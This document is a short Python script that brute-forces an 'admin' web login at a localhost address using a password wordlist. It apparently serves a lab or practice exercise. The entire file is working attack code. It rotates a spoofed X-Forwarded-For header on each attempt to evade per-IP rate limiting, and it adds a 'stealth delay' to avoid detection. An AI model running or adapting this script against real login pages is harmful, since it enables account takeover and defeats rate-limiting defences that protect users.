import requests
import time

url = "http://127.0.0.1:5000"
username = "admin"

attempts = 0

with open("wordlist.txt", "r") as file:
    for line in file:
        password = line.strip()
        attempts += 1

        data = {
            "username": username,
            "password": password
        }
        headers = {
            "X-Forwarded-For": f"192.168.1.{attempts}"
            }
        response = requests.post(url, data=data, headers=headers)

        if "Login successful" in response.text:
            print(f"[SUCCESS] Password found: {password}")
            print(f"Attempts: {attempts}")
            break
        elif "Too many attempts" in response.text:
            print("[BLOCKED] Too many attempts detected!")
            break
        else:
            print(f"[FAILED] {password}")

        time.sleep(2)  # stealth delay